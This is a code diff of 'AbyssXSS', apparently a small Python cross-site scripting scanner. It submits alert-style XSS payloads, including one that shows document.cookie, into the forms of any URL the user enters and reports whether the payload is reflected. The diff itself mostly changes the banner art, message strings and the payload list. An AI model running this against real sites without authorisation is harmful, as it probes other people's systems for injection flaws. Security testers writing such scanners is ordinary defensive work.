@@ -5,36 +5,17 @@ from urllib.parse import urljoin
 
 def AbyssXSS_logo():
     print("""          
-                      
-         
-⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⣶⣿⣿⣿⣿⣿⣷⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀
-⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀
-⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀
-⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆
-⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷   
-⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿
-⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⠁⠈⠻⣿⡿⠁⠈⠙⢿⣿⣿⣿⡇   
-⠀⠙⠙⢿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⣸⣿⣿⣿⠀
-⠀⡞⠀⢈⣿⣿⣿⣿⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣧⠀⢠⣿⣿⣿⠇⠀                
-⢈⣽⣦⣼⣿⣿⣿⣡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⠀⣼⣿⣿⠏⠀⠀
-⠸⣿⣿⡿⡟⣿⣿⣿⣿⣶⣶⣶⣤⣤⣤⣤⣤⣼⣿⣿⣿⣿⡟⠰⠿⠛⠁⠀⠀⠀
-⠀⠙⢿⣹⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⠀⠹⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⢿⣶⣿⣿⣿⣿⣿⣿⠟⡙⣿⣿⣿⣿⣧⡀⠹⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⡟⢸⡇⢸⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀made by MadMatrix⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠈⣿⢿⣿⣿⣿⣇⠘⠁⢸⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⢹⣼⣿⢸⣿⣿⣶⠀⢸⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⢈⡇⣿⡇⣿⣿⣿⣆⠈⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠉⠻⠧⢹⣿⠿⠋⠀⠀⠀⠀⠀
-                  
-    _    _                  __  ______ ____  
-   / \  | |__  _   _ ___ ___\ \/ / ___/ ___| 
-  / _ \ | '_ \| | | / __/ __|\  /\___ \___ \ 
- / ___ \| |_) | |_| \__ \__ \/  \ ___) |__) |
-/_/   \_\_.__/ \__, |___/___/_/\_\____/____/ 
-               |___/                         
+          
+ ▄▄▄       ▄▄▄▄ ▓██   ██▓  ██████   ██████ ▒██   ██▒  ██████   ██████ 
+▒████▄    ▓█████▄▒██  ██▒▒██    ▒ ▒██    ▒ ▒▒ █ █ ▒░▒██    ▒ ▒██    ▒ 
+▒██  ▀█▄  ▒██▒ ▄██▒██ ██░░ ▓██▄   ░ ▓██▄   ░░  █   ░░ ▓██▄   ░ ▓██▄   
+░██▄▄▄▄██ ▒██░█▀  ░ ▐██▓░  ▒   ██▒  ▒   ██▒ ░ █ █ ▒   ▒   ██▒  ▒   ██▒
+ ▓█   ▓██▒░▓█  ▀█▓░ ██▒▓░▒██████▒▒▒██████▒▒▒██▒ ▒██▒▒██████▒▒▒██████▒▒
+ ▒▒   ▓▒█░░▒▓███▀▒ ██▒▒▒ ▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░▒▒ ░ ░▓ ░▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░
+  ▒   ▒▒ ░▒░▒   ░▓██ ░▒░ ░ ░▒  ░ ░░ ░▒  ░ ░░░   ░▒ ░░ ░▒  ░ ░░ ░▒  ░ ░
+  ░   ▒    ░    ░▒ ▒ ░░  ░  ░  ░  ░  ░  ░   ░    ░  ░  ░  ░  ░  ░  ░  
+      ░  ░ ░     ░ ░           ░        ░   ░    ░        ░        ░  
+                ░░ ░                                                                         
                 
           """)
 
@@ -73,7 +54,7 @@ def submit_form(form_details, url, value):
             data[input["name"]] = input.get("value", "")
 
     print(f"[+] Submitting malicious payload to {target_url}")
-    print(f"[+] Data: {data}")
+    print(f"[+] Payload : {data}")
     
     try:
         if form_details["method"] == "post":
@@ -104,19 +85,21 @@ def AbyssXSS_scan(url, payload, xss_type):
             
             if payload in content:
                 print(f"[+] {xss_type} Vulnerable XSS Detected on {url}")
-                print(f"[*] Form details:")
+                print(f"[*] Form details :")
                 pprint(form_details)
                 is_vulnerable = True
 
-    return "[*] Vulnerable XSS" if is_vulnerable else "[*] Not XSS Vulnerable"
+    return "[*] Vulnerable XSS " if is_vulnerable else "[*] Not XSS Vulnerable"
 
-def AbyssXSS_payload_menu():
+def AbyssXSS_payload_menu(url):
+    DOM_payloads = {
+        "http://example.com": "<script>alert('DOM XSS')</script>"
+    }
+
     payloads = {
         "1": "<script>alert('Reflected XSS')</script>",  
-        "2": "<img src=x onerror=alert('AbyssXSS!!!')>",  
-        "3": "<svg onload=alert('by abyss DOM XSS')>",  
-        "4": "<iframe src='javascript:alert(\"XSS\")'></iframe>",  
-        "5": "<body onload=alert('by abyss XSS')>"  
+        "2": "<script>alert(document.cookie)</script>",  
+        "3": "<script>alert('Default DOM XSS')</script>",  
     }
 
     print("SELECT XSS PAYLOADS:")
@@ -134,9 +117,13 @@ def AbyssXSS_payload_menu():
         payload = payloads.get("2")  
     elif AbyXSS_choice == "3":
         xss_type = "DOM XSS"
-        payload = payloads.get("3")  
+        if url in DOM_payloads:
+            payload = DOM_payloads[url]
+        else:
+            payload = payloads.get("3")  
+        print(f"Using payload: {payload}")
     else:
-        print("Invalid choice. Defaulting to reflected XSS payload.")
+        print("hmm.")
         xss_type = "Reflected XSS"
         payload = payloads.get("1")  
 
@@ -144,7 +131,7 @@ def AbyssXSS_payload_menu():
 
 if __name__ == "__main__":
     url = input("Enter the XSS Target URL : ")
-    payload, xss_type = AbyssXSS_payload_menu()
+    payload, xss_type = AbyssXSS_payload_menu(url)
     result = AbyssXSS_scan(url, payload, xss_type)
     print(result)
 
